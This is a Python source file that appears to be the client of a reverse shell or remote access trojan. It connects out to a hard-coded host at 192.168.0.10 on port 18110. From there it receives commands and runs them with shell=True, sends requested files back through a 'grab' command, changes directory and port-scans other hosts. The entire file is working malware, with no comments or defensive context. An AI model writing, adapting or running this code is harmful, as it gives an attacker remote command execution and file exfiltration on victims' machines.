import socket
import subprocess
import os

def transfer(s,path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send("Unable to find the file.".encode())

def scanner(ip,ports):
    scan_result = ''
    for port in ports.split(','):
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            output = sock.connect_ex((ip,int(port)))

            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is open.\n"
            else:
                scan_result = scan_result + "[+] Port " + port + " is closed or the host is not reachable.\n"
            sock.close()
        except Exception as e:
            pass
    return scan_result

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 18110))

    while True:
        command = s.recv(1024).decode()

        if 'terminate' in command:
            s.close()
            break
        elif "grab" in command:
            grab,path = command.split(" * ")
            try:
                transfer(s,path)
            except Exception as e:
                s.send(str(e).encode())
                pass
        elif 'cd ' in command:
            code,directory = command.split()
            os.chdir(directory)
            s.send(("[+] CWD is " + os.getcwd()).encode())
        elif 'scan' in command:
            command = command[5:]
            ip,ports = command.split(':')
            s.send(scanner(ip,ports).encode())
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())

            if CMD.stderr is not None:
                s.send(CMD.stderr.read())

def main():
    connect()

main()
